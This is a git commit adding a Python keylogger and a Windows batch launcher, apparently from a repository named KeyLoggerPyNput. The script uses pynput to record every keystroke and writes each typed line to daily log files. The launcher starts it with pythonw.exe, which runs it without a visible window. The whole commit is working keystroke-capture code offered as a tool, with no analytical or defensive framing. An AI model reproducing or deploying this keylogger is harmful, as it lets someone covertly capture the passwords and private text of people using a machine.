3c154e054713578b6e71eb9b1e01ebc226869fdf
Jemak <jmacposadas@gmail.com>
2019-01-07 21:23:06 +0800

    Add files via upload

---
+++ launch.bat
@@ -0,0 +1,3 @@
+@echo off
+C:\Users\Jemak\AppData\Local\Programs\Python\Python36\pythonw.exe C:\Users\Jemak\Desktop\forked\KeyLoggerPyNput\pynput2.py
+PAUSE
---
+++ pynput2.py
@@ -0,0 +1,29 @@
+from pynput import keyboard
+from datetime import datetime
+import logging
+
+todays_date = datetime.now().strftime('%Y-%b-%d')
+log_dir = "C:\\Users\\Jemak\\Desktop\\forked\\KeyLoggerPyNput\\Logs\\"
+
+logging.basicConfig(filename=(log_dir + todays_date + '.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+stri = ""
+
+def on_press(key):
+    global stri
+    #try:
+    #print(key.char)
+    try:
+        stri += str(key.char)
+
+    except AttributeError:
+        if key == keyboard.Key.enter:
+            print(stri)
+            logging.info(stri)
+            stri = ""
+        else:
+            stri += ' '
+
+# Collect events until released
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
